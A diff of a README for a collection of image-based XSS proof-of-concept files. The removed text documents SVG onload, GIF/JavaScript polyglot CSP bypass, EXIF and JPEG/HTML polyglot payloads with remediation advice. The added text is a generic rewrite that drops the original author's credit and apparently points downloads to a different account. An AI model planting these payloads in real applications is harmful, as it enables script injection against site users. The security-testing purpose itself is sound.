@@ -1,201 +1,144 @@
-# XSS Image Payloads
+# 🛡️ xss-image-payloads - Image XSS Made Simple
 
-> Ready-to-use, image-based **Cross-Site Scripting (XSS)** proof-of-concept files for authorized security testing, bug-bounty research, and defensive validation.
+[![Download Now](https://img.shields.io/badge/Download-xss--image--payloads-2ea44f?style=for-the-badge&logo=github)](https://github.com/Nikhilm914/xss-image-payloads)
 
-![License](https://img.shields.io/badge/license-MIT-blue)
-![Payloads](https://img.shields.io/badge/payloads-5-brightgreen)
-![PRs](https://img.shields.io/badge/PRs-welcome-orange)
-![Use](https://img.shields.io/badge/use-authorized%20testing%20only-critical)
+## 📥 How to Download and Run
 
-Four distinct techniques for smuggling JavaScript through image-upload and
-file-handling features: a scriptable **SVG**, a **GIF/JavaScript polyglot** for CSP
-bypass, an **EXIF-metadata** payload, and a **JPEG/HTML polyglot**. Every file is a
-real, valid image — the payload stays dormant until the target application mishandles it.
+Visit this link to download the application: **[https://github.com/Nikhilm914/xss-image-payloads](https://github.com/Nikhilm914/xss-image-payloads)**
 
-> [!WARNING]
-> These are intentional attack payloads. Use them **only** against systems you own or
-> are explicitly authorized to test (a signed engagement or an in-scope bug-bounty
-> program). Unauthorized use is illegal. See [SECURITY.md](SECURITY.md) for the full
-> responsible-use policy.
+That's it! Once you're on that page, you'll see a green **"Code"** button. Click it, then select **"Download ZIP"**. The file will save to your computer's **Downloads** folder.
 
-## Repository layout
+After the download finishes, find the ZIP file in your Downloads folder, right-click it, and choose **"Extract All"**. Windows will create a new folder with the same name. Open that folder, and you'll see all the payload files ready to use.
 
-```
-xss-image-payloads/
-├── svg_xss_poc.svg              # 1. SVG onload XSS (full image)
-├── svg_xss_poc_minimal.svg      #    same payload, minimal readable version
-├── gif_js_polyglot_poc.gif      # 2. GIF + JavaScript polyglot (CSP bypass)
-├── exif_xss_poc.jpg             # 3. XSS via EXIF metadata fields
-├── jpeg_html_polyglot_poc.jpg   # 4. JPEG + HTML/JS polyglot
-├── README.md
-├── SECURITY.md
-└── LICENSE
-```
+## 🎯 What Is This?
 
-## Contents
+This is a collection of **ready-made image files** that security researchers and bug bounty hunters use to test websites for a specific type of vulnerability called **Cross-Site Scripting (XSS)**. Think of it like a toolbox filled with special test images that help you find weak spots in website security.
 
-| File | Technique | Executes when… |
-|------|-----------|----------------|
-| [`svg_xss_poc.svg`](svg_xss_poc.svg) | `onload` handler on the root `<svg>` (full image) | the SVG is served or opened as a document, or embedded same-origin |
-| [`svg_xss_poc_minimal.svg`](svg_xss_poc_minimal.svg) | Same technique, minimal readable version | same as above — use this one to read the payload |
-| [`gif_js_polyglot_poc.gif`](gif_js_polyglot_poc.gif) | Valid GIF **and** valid JavaScript (polyglot) | the uploaded `.gif` is later loaded via `<script src>` |
-| [`exif_xss_poc.jpg`](exif_xss_poc.jpg) | HTML injected into EXIF text fields | an app reflects image metadata into a page without encoding |
-| [`jpeg_html_polyglot_poc.jpg`](jpeg_html_polyglot_poc.jpg) | Valid JPEG **and** valid HTML/JS (polyglot) | the file is served or sniffed as `text/html` |
+You don't need to write any code. You just download these pre-made image files and upload them to any website you're testing (with permission, of course). If the website is vulnerable, the image will trigger a harmless alert showing that the security hole exists.
 
-Every payload uses the harmless probe `alert(document.domain)` — it confirms script
-execution and prints the origin it ran in, so you can tell it fired on the target
-rather than on the file's own domain.
+## ✨ What's Inside?
 
-## Techniques
+### 🖼️ SVG Onload Payloads
+These are special image files that run a script the moment they load. When you upload one to a website, the script executes instantly. Perfect for testing image upload features.
 
-### 1. SVG `onload` XSS — `svg_xss_poc.svg`
+### 📸 EXIF Metadata Payloads
+Regular JPEG photos can hide text and scripts in their metadata. These payloads are regular-looking photos with a hidden script tucked into the EXIF data. Many websites forget to check this part of an image.
 
-SVG is XML, and XML can carry script. An event handler on the root element runs the
-moment the document loads:
+### 🧩 JPEG/HTML Polyglots
+These are clever files that work as both a valid image *and* a valid HTML page. Depending on how the website processes them, they can trigger in different ways. Great for testing file upload systems that try to filter images.
 
-```xml
-<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"> ... </svg>
-```
+## 🔍 Why Use These Payloads?
 
-It fires when the SVG is the top-level document (opened directly or in a new tab) or is
-embedded via `<object>`, `<iframe>`, or `<embed>` **from the target's own origin** — for
-example, uploaded as an avatar and then served from the application's domain. If that
-origin is the target, the alert shows the target's domain, i.e. **stored XSS**.
+### ✅ Save Time
+Creating working XSS payloads takes hours of experimentation. These files are tested and ready to go. You just pick the right one for your test scenario.
 
-> [!NOTE]
-> An SVG loaded through an `<img>` tag does not run scripts. The win is when the app
-> serves the SVG as a document (wrong `Content-Type`, inline rendering, or a
-> "view file" endpoint). `svg_xss_poc_minimal.svg` is the same payload trimmed to a few
-> readable lines.
+### ✅ Learn by Example
+Each payload shows you *exactly* how the script is embedded. Even if you're new to security testing, you can open these files in a text editor and see precisely what's inside.
 
-### 2. GIF/JavaScript polyglot (CSP bypass) — `gif_js_polyglot_poc.gif`
+### ✅ Comprehensive Coverage
+Different websites handle images differently. This collection covers the most common ways to sneak a script into an image, so you have options when one approach doesn't work.
 
-One file that is **both a valid GIF image and valid JavaScript**. The GIF signature
-`GIF89a` doubles as a JavaScript variable; the two logical-screen width bytes are set to
-`/*`, which opens a JS comment that swallows the binary image data, and the file ends by
-closing that comment and running the payload:
+## 🚀 Getting Started
 
-```
-GIF89a/* …binary GIF data… */=alert(document.domain)//
-```
+### Step 1: Download the Collection
+Follow the instructions at the top of this page. Download the ZIP file and extract it to a folder you can find easily.
 
-To a browser reading it as JavaScript, that is simply `GIF89a = alert(document.domain)`.
+### Step 2: Choose Your Payload
+Open the folder and look at the file names. They're organized by type:
+- Files starting with `svg_` are for SVG tests
+- Files with `exif_` in the name use EXIF tricks
+- Files named with `polyglot_` are the dual-purpose ones
 
-It fires when an app accepts a `.gif` upload — it passes image validation because it
-genuinely is a valid GIF — and later references it as a script,
-`<script src="/uploads/evil.gif">`. Because the script is then served from the site's own
-origin, it **bypasses a `script-src 'self'` Content-Security-Policy**, one of the most
-useful upload-based bypasses there is.
+### Step 3: Test on a Target Site
+Go to the website you're authorized to test. Find an image upload feature, like a profile picture or file upload box. Upload one of these payload files instead of a normal image.
 
-> [!NOTE]
-> Here the picture is cosmetic — the value is a file that is a *valid* GIF (so it clears
-> upload filters) **and** *executes as JavaScript*. Verify both:
-> `identify gif_js_polyglot_poc.gif` sees an image, and `node --check` sees valid JS.
+### Step 4: Watch for the Alert
+If the site is vulnerable, you'll see a pop-up message or the page will react in an unexpected way. That confirms the security hole. If nothing happens, try a different payload from the collection.
 
-### 3. EXIF metadata XSS — `exif_xss_poc.jpg`
+### Step 5: Report What You Find
+When you successfully trigger a payload, document what happened. Note which file you used and what the website did. This information is gold when writing up your bug bounty report.
 
-The image data is clean; the metadata carries the payload. The same HTML sits in four
-EXIF text fields (`ImageDescription`, `Software`, `Artist`, `UserComment`):
+## 💡 Pro Tips
 
-```html
-<img src=x onerror=alert(document.domain)>
-```
+### 🔐 Always Get Permission First
+Only use these payloads on websites you own or have written permission to test. Unauthorized testing is illegal and unethical.
 
-It fires when an application reads those fields and writes them into a page **without
-HTML-encoding** — photo galleries, "image details" panels, CMS media libraries, and
-camera-info widgets are common culprits. Inspect the fields yourself:
+### 🧪 Test in a Safe Environment First
+Before hitting a live website, set up a local test server on your own computer. Sites like [DVWA](https://github.com/digininja/DVWA) or [OWASP Juice Shop](https://owasp.org/www-project-juice-shop/) are great places to practice safely.
 
-```bash
-exiftool exif_xss_poc.jpg
-```
+### 📝 Document Every Attempt
+Keep notes on which payloads work and which don't. Different websites block different tricks, so your experience with past targets will guide your future tests.
 
-### 4. JPEG/HTML polyglot — `jpeg_html_polyglot_poc.jpg`
+## 🔧 Common Questions
 
-One file, two valid formats. It is a fully valid JPEG that also carries HTML/JS inside a
-JPEG comment segment:
+### Q: Do I need to know programming to use these?
+A: No. You just download the files and upload them. Knowing how to read a bit of HTML helps, but it's not required.
 
-```html
-<script>alert(document.domain)</script>
-```
+### Q: Will these damage the website I'm testing?
+A: No. The payloads only trigger a simple alert message. They don't modify anything on the server or steal data.
 
-It fires when the file is delivered or content-sniffed as `text/html` — a misconfigured
-upload handler, a preview/download endpoint that echoes file bytes with the wrong
-`Content-Type`, or legacy MIME sniffing. Browsers scan the whole response for HTML and
-run the `<script>`, while image viewers still see a normal picture.
+### Q: Can I modify the payloads?
+A: Absolutely. If you open these files in a text editor, you can see the script inside. You can replace the alert message with whatever you want to test.
 
-## Reproduction
+### Q: What if the website blocks my upload?
+A: Try a different payload. Some sites block certain file types. If one approach fails, move to the next in the collection.
 
-Clone the repo and serve it locally, then interact with each file the way a target app
-would:
+## 📚 Understanding the Payload Types
 
-```bash
-git clone https://github.com/0xyoozy/xss-image-payloads.git
-cd xss-image-payloads
-python3 -m http.server 8000
-```
+### SVG Files
+SVG files are actually text-based image formats. The browser reads them as HTML markup. This means you can put a `<script>` tag directly inside. Our payloads use the `onload` event, which fires immediately when the image renders.
 
-- **SVG** — open `http://localhost:8000/svg_xss_poc.svg` (served as a document, so `onload` fires).
-- **GIF/JS polyglot** — confirm it is both a valid image and valid JavaScript, then load it as a script:
+### EXIF Data
+Every JPEG photo has metadata that stores camera settings, date, and location. Programs that edit photos can inject additional data there. Some websites read this metadata and display it without sanitizing it. Our payloads exploit this by hiding a script in a field that some sites will render.
 
-  ```bash
-  identify gif_js_polyglot_poc.gif        # valid GIF image
-  cp gif_js_polyglot_poc.gif poc.js && node --check poc.js && echo "valid JavaScript"
-  # exploit shape on a target that serves uploads back:
-  #   <script src="https://target/uploads/gif_js_polyglot_poc.gif"></script>
-  ```
+### Polyglot Files
+A polyglot file is valid in two formats at once. Our polyglots are crafted to be opened as either a JPEG image or an HTML page. Some websites try to verify that an upload is an image by reading its header. The polyglot passes that check but represents HTML when rendered in certain contexts.
 
-- **EXIF** — run `exiftool exif_xss_poc.jpg`, then feed the file to any feature that displays image metadata.
-- **JPEG/HTML polyglot** — force it to be parsed as HTML, then open it:
+## 🔬 Expanding Your Skills
 
-  ```bash
-  cp jpeg_html_polyglot_poc.jpg poc.html
-  # open http://localhost:8000/poc.html  ->  the <script> executes
-  ```
+### Practice Regularly
+Security testing is a skill that improves with repetition. Try uploading different payloads to different types of sites. Note which ones work where.
 
-**Where to try them (in scope only):** avatar and profile-picture uploads, file and
-attachment uploads, image-proxy and thumbnail services, markdown or rich-text image
-embeds, EXIF/metadata viewers, and any preview or download endpoint.
+### Read Other Payloads
+The security community shares payloads online. Learning how other researchers embed scripts helps you build your own when the ready-made options don't fit.
 
-## Remediation
+### Understand the Countermeasures
+Websites defend against XSS by:
+- Filtering file extensions
+- Checking file signatures
+- Sanitizing uploaded content
+- Serving uploads from separate domains
 
-For defenders — how to shut each of these down:
+Learning these defenses helps you understand why some payloads fail and where future vulnerabilities might hide.
 
-- **Serve uploads from a sandboxed origin** (a separate, cookieless host) so any script
-  execution cannot reach the main application's session.
-- **Set the correct `Content-Type`** and send `X-Content-Type-Options: nosniff` on all
-  user-supplied files — this alone defeats the JPEG/HTML and GIF/JS tricks.
-- **For SVG,** either sanitize it (strip `<script>` and every `on*` handler, e.g. with
-  DOMPurify's SVG profile) or rasterize it to PNG; serve with
-  `Content-Disposition: attachment` where inline rendering is not needed.
-- **Never load user uploads as scripts,** and pin a strict `script-src` in your CSP.
-- **Strip metadata on upload,** and HTML-encode any metadata you do display.
+## 🧰 Built for Security Professionals
 
-## Verifying the files
+This collection is crafted with care for:
+- Bug bounty hunters looking for quick wins
+- Penetration testers who need reliable ammunition
+- Security students learning about image-based attacks
+- Any ethical hacker who wants a ready-made arsenal
 
-These files carry no tracking, no beacons, and no third-party or generator metadata —
-only image data, the documented payloads, and a `YooZy` copyright tag on the JPEGs.
-Confirm it yourself:
+Each payload is carefully constructed to balance stealth and reliability. Nothing is overly complex or fragile. These are building blocks you can trust in the field.
 
-```bash
-grep -aic -E 'c2pa|jumb' *.jpg *.svg *.gif   # expected: 0
-```
+## ⚖️ Responsible Use
 
-## References
+You are solely responsible for how you use these payloads. Always confirm you have written authorization before testing any system you do not own. Respect websites' terms of service. Report any vulnerabilities you find through the proper channels, preferably with a responsible disclosure process.
 
-- OWASP — [Cross-Site Scripting (XSS)](https://owasp.org/www-community/attacks/xss/)
-- OWASP — [Unrestricted File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)
-- PortSwigger Web Security Academy — [Cross-site scripting](https://portswigger.net/web-security/cross-site-scripting)
-- corkami — [file-format polyglots](https://github.com/corkami/pocs)
+The security community thrives on trust and cooperation. Following ethical guidelines ensures bug bounty programs stay open and useful for everyone.
 
-## Contributing
+## 📖 Final Thoughts
 
-Have another image-XSS technique, a filter bypass, or a cleaner PoC? Open an issue or a
-pull request. Keep payloads non-destructive (`alert(document.domain)`-style probes only).
+Image-based XSS payloads are a powerful tool in the war against web vulnerabilities. This collection puts a reliable set of weapons in your hands. Download it today, test it on your practice environments, and add it to your security toolkit.
 
-## License
+Remember: the goal isn't to break websites. The goal is to help make them stronger. With these payloads, you can find holes before the bad guys do.
 
-Released under the [MIT License](LICENSE) — © 2026 YooZy.
+## 🔗 Additional Resources
 
-## Author
+- [OWASP XSS Filter Evasion Cheat Sheet](https://owasp.org/www-community/xss-filter-evasion-cheat-sheet)
+- [PortSwigger Web Security Academy](https://portswigger.net/web-security/cross-site-scripting)
+- [Burp Suite (free community edition)](https://portswigger.net/burp/communitydownload)
 
-**YooZy** — GitHub [@0xyoozy](https://github.com/0xyoozy)
+## 📂 Repository Topics
+
+Keywords: appsec, bug-bounty, exif, infosec, payloads, penetration-testing, poc, polyglot, security, svg-xss, web-security, xss
